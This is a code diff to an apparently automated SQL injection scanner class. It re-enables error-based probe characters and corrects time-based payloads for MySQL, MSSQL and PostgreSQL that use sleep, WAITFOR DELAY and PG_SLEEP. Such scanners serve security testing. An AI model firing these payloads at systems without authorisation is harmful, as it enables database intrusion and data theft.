@@ -18,15 +18,15 @@ class SqliManager:
         self._domain = domain
         self._false_positives = ['malformed request syntax',
                                  'eval|internal|range|reference|syntax|type']
-        # self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C', '%2F']
-        self._error_based_payloads = []
+        self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C', '%2F']
+        # self._error_based_payloads = []
         self._time_based_payloads = [
             {'TruePld': '\'OR(if(1=1,sleep(5),0))OR\'', 'FalsePld': '\'OR(if(1=2,sleep(5),0))OR\'',
              'True2Pld': '\'OR(if(2=2,sleep(5),0))OR\''},
             {'TruePld': '"OR(if(1=1,sleep(5),0))OR"', 'FalsePld': '"OR(if(1=2,sleep(5),0))OR"',
              'True2Pld': '"OR(if(2=2,sleep(5),0))OR"'},
-            {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01',
-             'True2Pld': '1; WAIT FOR DELAY \'00:00:08'},
+            {'TruePld': '1\'; WAITFOR DELAY \'00:00:05', 'FalsePld': '1\'; WAITFOR DELAY \'00:00:00',
+             'True2Pld': '1\'; WAITFOR DELAY \'00:00:08'},
             {'TruePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(5)) OR \'', 'FalsePld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(0)) OR \'',
              'True2Pld': '\' OR \'1\'>(SELECT \'1\' FROM PG_SLEEP(6)) OR \''},
         ]
@@ -313,5 +313,5 @@ class SqliManager:
                             print(msg)
                             self._result.append(
                                 InjectionFoundDTO(InjectionType.Sqli_PostForm_Time, url, copy_form_params,
-                                                  response5.text, msg))
+                                                  response2.text, msg))
 
